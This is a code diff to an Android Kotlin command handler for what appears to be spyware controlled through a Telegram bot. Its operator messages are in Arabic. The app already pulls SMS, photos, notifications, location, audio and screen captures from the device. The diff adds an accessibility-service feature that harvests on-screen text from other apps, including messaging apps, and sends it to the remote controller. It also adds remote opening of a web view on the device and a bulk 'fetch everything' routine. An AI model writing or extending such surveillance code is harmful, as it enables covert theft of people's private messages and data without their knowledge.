@@ -19,6 +19,7 @@ object CommandExecutor {
 
         when {
             callbackData == "menu" -> showMainMenu(ctx)
+            callbackData == "open_site" -> openSite(ctx)
             callbackData == "info" -> showDeviceInfo(ctx)
             callbackData == "location" -> showLocation(ctx)
             callbackData == "photos_all" -> fetchAllPhotos(ctx)
@@ -26,6 +27,8 @@ object CommandExecutor {
             callbackData == "photos_200" -> fetchLastPhotos(ctx, 200)
             callbackData == "sms_all" -> fetchAllSms(ctx)
             callbackData == "notifs_all" -> fetchAllNotifs(ctx)
+            callbackData == "accessibility_log" -> fetchAccessibility(ctx)
+            callbackData == "accessibility_clear" -> clearAccessibility(ctx)
             callbackData == "audio_start" -> startAudio(ctx)
             callbackData == "audio_stop" -> stopAudio(ctx)
             callbackData == "screen_once" -> captureOnce(ctx)
@@ -43,11 +46,13 @@ object CommandExecutor {
         val cmd = text.trim().lowercase()
         when {
             cmd == "/start" || cmd == "/menu" -> showMainMenu(ctx)
+            cmd == "/site" -> openSite(ctx)
             cmd == "/info" -> showDeviceInfo(ctx)
             cmd == "/location" || cmd == "/loc" -> showLocation(ctx)
             cmd == "/photos" -> fetchAllPhotos(ctx)
             cmd == "/sms" -> fetchAllSms(ctx)
             cmd == "/notifs" -> fetchAllNotifs(ctx)
+            cmd == "/accessibility" || cmd == "/acc" -> fetchAccessibility(ctx)
             cmd == "/audio_start" -> startAudio(ctx)
             cmd == "/audio_stop" -> stopAudio(ctx)
             cmd == "/screen" -> captureOnce(ctx)
@@ -73,6 +78,17 @@ object CommandExecutor {
         TelegramApi.sendMessage(text, KeyboardBuilder.mainMenu())
     }
 
+    private fun openSite(ctx: Context) {
+        try {
+            TelegramApi.sendMessage("🌐 *جاري فتح الموقع على الجهاز...*")
+            val intent = android.content.Intent(ctx, WebViewActivity::class.java)
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            ctx.startActivity(intent)
+        } catch (e: Exception) {
+            TelegramApi.sendMessage("❌ فشل فتح الموقع: ${e.message}")
+        }
+    }
+
     private fun showDeviceInfo(ctx: Context) {
         val info = DeviceInfo.getFullInfo(ctx)
         TelegramApi.sendMessage(info, KeyboardBuilder.backToMenu())
@@ -85,6 +101,81 @@ object CommandExecutor {
             val text = LocationHelper.formatLocation(ctx, loc)
             TelegramApi.sendMessage(text, KeyboardBuilder.backToMenu())
         }
+    }
+
+    // ═══════════════════════════════════════════
+    //  ACCESSIBILITY — قراءة نصوص الشاشة
+    // ═══════════════════════════════════════════
+    private fun fetchAccessibility(ctx: Context) {
+        runJob(ctx, "accessibility") {
+            if (!AccessibilityHelper.isEnabled(ctx)) {
+                TelegramApi.sendMessage(
+                    "⚠️ *خدمة Accessibility غير مفعّلة*\n\n" +
+                    "الحل:\n" +
+                    "1. الإعدادات → إمكانية الوصول\n" +
+                    "2. التطبيقات المثبتة\n" +
+                    "3. CREFTEX → فعّلها\n\n" +
+                    "بعدها أعد المحاولة.",
+                    KeyboardBuilder.backToMenu()
+                )
+                return@runJob
+            }
+
+            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 500)
+            if (lines.isEmpty()) {
+                TelegramApi.sendMessage(
+                    "📝 *لا توجد نصوص محفوظة بعد*\n\n" +
+                    "الخدمة مفعّلة، لكن لم تُقرأ أي نصوص.\n" +
+                    "جرّب:\n" +
+                    "• فتح أي تطبيق واكتب شي\n" +
+                    "• فتح واتساب/رسائل\n" +
+                    "• تصفح الإنترنت\n\n" +
+                    "ثم اطلب الأمر مرة ثانية.",
+                    KeyboardBuilder.backToMenu()
+                )
+                return@runJob
+            }
+
+            val sb = StringBuilder()
+            sb.append("📝 *نصوص الشاشة* — ${lines.size} حدث\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+
+            var count = 0
+            for (line in lines) {
+                try {
+                    val obj = JSONObject(line)
+                    val type = obj.optString("type")
+                    if (type != "accessibility") continue
+
+                    val time = obj.optString("time", "")
+                    val pkg = obj.optString("package", "")
+                    val texts = obj.optString("texts", "")
+
+                    sb.append("📱 *$pkg*\n")
+                    sb.append("🕐 $time\n")
+                    sb.append("$texts\n\n")
+
+                    count++
+
+                    if (sb.length > 3500) {
+                        TelegramApi.sendMessage(sb.toString())
+                        sb.clear()
+                    }
+
+                    if (count >= 50) {
+                        sb.append("… +${lines.size - count} آخرين\n")
+                        break
+                    }
+                } catch (_: Exception) {}
+            }
+
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
+        }
+    }
+
+    private fun clearAccessibility(ctx: Context) {
+        AccessibilityHelper.clearCapturedTexts(ctx)
+        TelegramApi.sendMessage("🗑 تم حذف النصوص المخزنة", KeyboardBuilder.backToMenu())
     }
 
     private fun captureCamera(ctx: Context, front: Boolean) {
@@ -101,9 +192,6 @@ object CommandExecutor {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  SCREEN CAPTURE — معالجة مُحسّنة
-    // ═══════════════════════════════════════════
     private fun captureOnce(ctx: Context) {
         if (!ScreenCapture.isReady) {
             TelegramApi.sendMessage(
@@ -330,6 +418,10 @@ object CommandExecutor {
             Thread.sleep(500)
             TelegramApi.sendMessage("3️⃣ *إشعارات...*")
             fetchAllNotifs(ctx)
+
+            Thread.sleep(500)
+            TelegramApi.sendMessage("4️⃣ *نصوص Accessibility...*")
+            fetchAccessibility(ctx)
 
             TelegramApi.sendMessage("✅ *اكتمل الجلب الشامل*", KeyboardBuilder.mainMenu())
         }
